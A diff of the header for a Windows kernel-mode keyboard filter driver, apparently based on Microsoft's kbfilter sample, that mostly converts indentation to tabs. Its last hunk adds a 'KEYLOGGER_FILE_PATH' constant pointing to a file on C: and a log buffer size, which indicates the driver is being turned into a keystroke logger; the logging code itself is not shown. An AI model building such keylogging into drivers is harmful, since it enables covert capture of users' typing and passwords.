@@ -3,16 +3,16 @@ Copyright (c) 1997  Microsoft Corporation
 
 Module Name:
 
-    kbfilter.h
+	kbfilter.h
 
 Abstract:
 
-    This module contains the common private declarations for the keyboard
-    packet filter
+	This module contains the common private declarations for the keyboard
+	packet filter
 
 Environment:
 
-    kernel mode only
+	kernel mode only
 
 --*/
 
@@ -58,60 +58,60 @@ Environment:
 
 typedef struct _DEVICE_EXTENSION
 {
-    WDFDEVICE WdfDevice;
+	WDFDEVICE WdfDevice;
 
-    //
-    // Queue for handling requests that come from the rawPdo
-    //
-    WDFQUEUE rawPdoQueue;
+	//
+	// Queue for handling requests that come from the rawPdo
+	//
+	WDFQUEUE rawPdoQueue;
 
-    //
-    // Number of creates sent down
-    //
-    LONG EnableCount;
+	//
+	// Number of creates sent down
+	//
+	LONG EnableCount;
 
-    //
-    // The real connect data that this driver reports to
-    //
-    CONNECT_DATA UpperConnectData;
+	//
+	// The real connect data that this driver reports to
+	//
+	CONNECT_DATA UpperConnectData;
 
-    //
-    // Previous initialization and hook routines (and context)
-    //
-    PVOID UpperContext;
-    PI8042_KEYBOARD_INITIALIZATION_ROUTINE UpperInitializationRoutine;
-    PI8042_KEYBOARD_ISR UpperIsrHook;
+	//
+	// Previous initialization and hook routines (and context)
+	//
+	PVOID UpperContext;
+	PI8042_KEYBOARD_INITIALIZATION_ROUTINE UpperInitializationRoutine;
+	PI8042_KEYBOARD_ISR UpperIsrHook;
 
-    //
-    // Write function from within KbFilter_IsrHook
-    //
-    IN PI8042_ISR_WRITE_PORT IsrWritePort;
+	//
+	// Write function from within KbFilter_IsrHook
+	//
+	IN PI8042_ISR_WRITE_PORT IsrWritePort;
 
-    //
-    // Queue the current packet (ie the one passed into KbFilter_IsrHook)
-    //
-    IN PI8042_QUEUE_PACKET QueueKeyboardPacket;
+	//
+	// Queue the current packet (ie the one passed into KbFilter_IsrHook)
+	//
+	IN PI8042_QUEUE_PACKET QueueKeyboardPacket;
 
-    //
-    // Context for IsrWritePort, QueueKeyboardPacket
-    //
-    IN PVOID CallContext;
+	//
+	// Context for IsrWritePort, QueueKeyboardPacket
+	//
+	IN PVOID CallContext;
 
-    //
-    // Cached Keyboard Attributes
-    //
-    KEYBOARD_ATTRIBUTES KeyboardAttributes;
+	//
+	// Cached Keyboard Attributes
+	//
+	KEYBOARD_ATTRIBUTES KeyboardAttributes;
 
 } DEVICE_EXTENSION, *PDEVICE_EXTENSION;
 
 WDF_DECLARE_CONTEXT_TYPE_WITH_NAME(DEVICE_EXTENSION,
-                                        FilterGetData)
+	FilterGetData)
 
 
-typedef struct _WORKER_ITEM_CONTEXT {
+	typedef struct _WORKER_ITEM_CONTEXT {
 
-    WDFREQUEST  Request;
-    WDFIOTARGET IoTarget;
+	WDFREQUEST  Request;
+	WDFIOTARGET IoTarget;
 
 } WORKER_ITEM_CONTEXT, *PWORKER_ITEM_CONTEXT;
 
@@ -129,31 +129,31 @@ EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL KbFilter_EvtIoInternalDeviceControl;
 
 NTSTATUS
 KbFilter_InitializationRoutine(
-    IN PVOID                           InitializationContext,
-    IN PVOID                           SynchFuncContext,
-    IN PI8042_SYNCH_READ_PORT          ReadPort,
-    IN PI8042_SYNCH_WRITE_PORT         WritePort,
-    OUT PBOOLEAN                       TurnTranslationOn
-    );
+	IN PVOID                           InitializationContext,
+	IN PVOID                           SynchFuncContext,
+	IN PI8042_SYNCH_READ_PORT          ReadPort,
+	IN PI8042_SYNCH_WRITE_PORT         WritePort,
+	OUT PBOOLEAN                       TurnTranslationOn
+);
 
 BOOLEAN
 KbFilter_IsrHook(
-    PVOID                  IsrContext,
-    PKEYBOARD_INPUT_DATA   CurrentInput,
-    POUTPUT_PACKET         CurrentOutput,
-    UCHAR                  StatusByte,
-    PUCHAR                 DataByte,
-    PBOOLEAN               ContinueProcessing,
-    PKEYBOARD_SCAN_STATE   ScanState
-    );
+	PVOID                  IsrContext,
+	PKEYBOARD_INPUT_DATA   CurrentInput,
+	POUTPUT_PACKET         CurrentOutput,
+	UCHAR                  StatusByte,
+	PUCHAR                 DataByte,
+	PBOOLEAN               ContinueProcessing,
+	PKEYBOARD_SCAN_STATE   ScanState
+);
 
 VOID
 KbFilter_ServiceCallback(
-    IN PDEVICE_OBJECT DeviceObject,
-    IN PKEYBOARD_INPUT_DATA InputDataStart,
-    IN PKEYBOARD_INPUT_DATA InputDataEnd,
-    IN OUT PULONG InputDataConsumed
-    );
+	IN PDEVICE_OBJECT DeviceObject,
+	IN PKEYBOARD_INPUT_DATA InputDataStart,
+	IN PKEYBOARD_INPUT_DATA InputDataEnd,
+	IN OUT PULONG InputDataConsumed
+);
 
 EVT_WDF_REQUEST_COMPLETION_ROUTINE
 KbFilterRequestCompletionRoutine;
@@ -167,11 +167,11 @@ KbFilterRequestCompletionRoutine;
 // Used to identify kbfilter bus. This guid is used as the enumeration string
 // for the device id.
 DEFINE_GUID(GUID_BUS_KBFILTER,
-0xa65c87f9, 0xbe02, 0x4ed9, 0x92, 0xec, 0x1, 0x2d, 0x41, 0x61, 0x69, 0xfa);
+	0xa65c87f9, 0xbe02, 0x4ed9, 0x92, 0xec, 0x1, 0x2d, 0x41, 0x61, 0x69, 0xfa);
 // {A65C87F9-BE02-4ed9-92EC-012D416169FA}
 
 DEFINE_GUID(GUID_DEVINTERFACE_KBFILTER,
-0x3fb7299d, 0x6847, 0x4490, 0xb0, 0xc9, 0x99, 0xe0, 0x98, 0x6a, 0xb8, 0x86);
+	0x3fb7299d, 0x6847, 0x4490, 0xb0, 0xc9, 0x99, 0xe0, 0x98, 0x6a, 0xb8, 0x86);
 // {3FB7299D-6847-4490-B0C9-99E0986AB886}
 
 
@@ -181,12 +181,12 @@ DEFINE_GUID(GUID_DEVINTERFACE_KBFILTER,
 typedef struct _RPDO_DEVICE_DATA
 {
 
-    ULONG InstanceNo;
+	ULONG InstanceNo;
 
-    //
-    // Queue of the parent device we will forward requests to
-    //
-    WDFQUEUE ParentQueue;
+	//
+	// Queue of the parent device we will forward requests to
+	//
+	WDFQUEUE ParentQueue;
 
 } RPDO_DEVICE_DATA, *PRPDO_DEVICE_DATA;
 
@@ -195,8 +195,8 @@ WDF_DECLARE_CONTEXT_TYPE_WITH_NAME(RPDO_DEVICE_DATA, PdoGetData)
 
 NTSTATUS
 KbFiltr_CreateRawPdo(
-    WDFDEVICE       Device,
-    ULONG           InstanceNo
+	WDFDEVICE       Device,
+	ULONG           InstanceNo
 );
 
 
@@ -204,6 +204,11 @@ KbFiltr_CreateRawPdo(
 #endif  // KBFILTER_H
 
 //MB
+
+//file c:\\OS\\test.txt
+#define KEYLOGGER_FILE_PATH L"\\DosDevices\\C:\\OS\\test.txt"
+#define LOG_BUFFER_SIZE 50
+
 // Definition for OSR Work Queue Item
 //
 typedef struct _OSR_WORK_ITEM {
